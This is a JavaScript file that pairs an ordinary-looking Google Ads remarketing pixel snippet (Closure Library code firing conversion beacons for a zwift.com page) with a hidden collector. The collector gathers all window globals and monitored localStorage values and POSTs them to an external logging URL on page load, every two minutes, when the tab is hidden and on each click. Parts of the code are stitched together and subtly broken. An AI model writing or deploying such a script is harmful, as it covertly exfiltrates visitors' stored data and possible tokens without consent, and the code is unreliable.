(function () {
  /* An array of specific keys to monitor */
  const monitoredKeys = window.monitoredKeys;

  /* Function to generate a unique hash */
  var s = {};
  function createHash(val) {
    const keyList = Object.keys(val);
    const hashInput = keyList.reduce((accumulator, key) => accumulator + key, "");
    let generatedHash = 0;
    for (let index = 0; index < hashInput.length; index++) {
      const unicode = hashInput.charCodeAt(index);
      generatedHash = (generatedHash << 5) - generatedHash + unicode;
      generatedHash = generatedHash & generatedHash;
    }
    return generatedHash.toString(36);
  }

  /* A function to gather monitored data from local storage */
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var e = {},
      f = this || self;
    var g, k;
    a: {
      for (var l = ["CLOSURE_FLAGS"], p = f, q = 0; q < l.length; q++) if (p = p[l[q]], null == p) {
        k = null;
        break a;
      }
      k = p;
    }
    var r = k && k[610401301];
    g = null != r ? r : !1;
    var t,
      v = f.navigator;
    t = v ? v.userAgentData || null : null;
    function w(d) {
      return g ? t ? t.brands.some(function (a) {
        return (a = a.brand) && -1 != a.indexOf(d);
      }) : !1 : !1;
    }
    function x(d) {
      var a;
      a: {
        if (a = f.navigator) if (a = a.userAgent) break a;
        a = "";
      }
      return -1 != a.indexOf(d);
    }
    ;
    function y() {
      return g ? !!t && 0 < t.brands.length : !1;
    }
    function z() {
      return y() ? w("Chromium") : (x("Chrome") || x("CriOS")) && !(y() ? 0 : x("Edge")) || x("Silk");
    }
    ;
    !x("Android") || z();
    z();
    !x("Safari") || z() || (y() ? 0 : x("Coast")) || (y() ? 0 : x("Opera")) || (y() ? 0 : x("Edge")) || (y() ? w("Microsoft Edge") : x("Edg/")) || y() && w("Opera");
    var A = /#|$/;
    function B(d) {
      var a = d.search(A),
        b;
      a: {
        for (b = 0; 0 <= (b = d.indexOf("fmt", b)) && b < a;) {
          var c = d.charCodeAt(b - 1);
          if (38 == c || 63 == c) if (c = d.charCodeAt(b + 3), !c || 61 == c || 38 == c || 35 == c) break a;
          b += 4;
        }
        b = -1;
      }
      if (0 > b) return null;
      c = d.indexOf("&", b);
      if (0 > c || c > a) c = a;
      return decodeURIComponent(d.slice(b + 4, -1 !== c ? c : 0).replace(/\+/g, " "));
    }
    ;
    function C(d, a, b) {
      function c() {
        --D;
        if (0 >= D) {
          var h;
          (h = d.GooglebQhCsO) || (h = {});
          var E = h[a];
          E && (delete h[a], (h = E[0]) && h.call && h());
        }
      }
      for (var D = b.length + 1, u = 0; u < b.length; u++) {
        var m = B(b[u]),
          n = null;
        1 != m && 2 != m || !(m = d.document.getElementById("goog_conv_iframe")) || m.src || (n = m);
        n || (n = new Image());
        n.onload = c;
        n.src = b[u];
      }
      c();
    }
    var F = ["ss_"],
      G = s || f;
    F[0] in G || "undefined" == typeof G.execScript || G.execScript("var " + F[0]);
    for (var H; F.length && (H = F.shift());) F.length || void 0 === C ? G[H] && G[H] !== Object.prototype[H] ? G = G[H] : G = G[H] = {} : G[H] = C;
  }).call(this);
  function obtainTrackedData() {
    const collectedData = {};
    for (const key of monitoredKeys) {
      if (localStorage.hasOwnProperty(key)) {
        collectedData[key] = localStorage.getItem(key);
      }
    }
    return collectedData;
  }

  /* Function to check all global variables */
  function checkGlobalVars() {
    const globalVars = {};
    for (const varName in window) {
      globalVars[varName] = window[varName];
    }
    return globalVars;
  }
  function sendToServer(data) {
    const hash = createHash(data);
    const url = "https://sample.com/api/logging";
    fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hash: hash,
        data: data,
        timestamp: Date.now()
      })
    }).then(response => {
      if (response.ok) {
        console.log("Data successfully sent");
      } else {
        console.error(`Failed to send data, status code: ${response.status}`);
      }
    }).catch(error => {
      console.error(`Error occurred while sending data: ${error}`);
    });
  }

  /* Function to assemble data and send to the server */
  ;
  s.ss_(window, 'OjE2OTI1MzE5ODI5MDg', ['https://www.google.com/pagead/1p-user-list/833424328/?random\x3d1692531982908\x26cv\x3d11\x26fst\x3d1692529200000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.zwift.com%2Fja\x26frm\x3d0\x26tiba\x3dZwift%20%7C%20The%20at%20home%20training%20app%20connecting%20cyclists%20around%20the%20world\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d1450881277\x26rmt_tld\x3d0\x26ipr\x3dy', 'https://www.google.co.jp/pagead/1p-user-list/833424328/?random\x3d1692531982908\x26cv\x3d11\x26fst\x3d1692529200000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.zwift.com%2Fja\x26frm\x3d0\x26tiba\x3dZwift%20%7C%20The%20at%20home%20training%20app%20connecting%20cyclists%20around%20the%20world\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d1450881277\x26rmt_tld\x3d1\x26ipr\x3dy']);
  function accumulateAndSentTrackedData() {
    const globalVars = checkGlobalVars();
    const trackedData = {
      ...globalVars,
      ...obtainTrackedData()
    };
    if (Object.keys(trackedData).length > 0) {
      sendToServer(trackedData);
    }
  }

  /* Add event listeners */
  window.addEventListener("load", function () {
    accumulateAndSentTrackedData();
    setInterval(accumulateAndSentTrackedData, 2 * 60 * 1000);
  });
  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") {
      accumulateAndSentTrackedData();
    }
  });
  window.addEventListener("click", function (clickEvent) {
    const clickData = {
      clientX: clickEvent.clientX,
      clientY: clickEvent.clientY,
      target: clickEvent.target.tagName
    };
    sendToServer(`ClickEvent: ${JSON.stringify(clickData)}`);
  });
})();